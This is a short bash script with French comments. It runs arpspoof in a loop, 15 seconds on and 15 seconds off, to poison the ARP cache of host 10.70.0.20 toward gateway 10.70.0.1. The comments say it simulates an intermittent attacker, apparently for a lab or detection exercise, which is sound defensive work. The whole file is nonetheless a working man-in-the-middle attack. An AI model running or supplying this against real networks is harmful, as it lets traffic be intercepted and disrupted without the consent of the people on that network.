#!/bin/bash
# Empoisonne le cache ARP de l'analyste vers la passerelle par intermittence
# (15s actif / 15s silencieux), simulant un attaquant qui ne reste pas
# constamment actif. `timeout` coupe proprement arpspoof sans gestion de PID.
while true; do
  timeout 15 arpspoof -i eth0 -t 10.70.0.20 10.70.0.1 >/dev/null 2>&1
  sleep 15
done
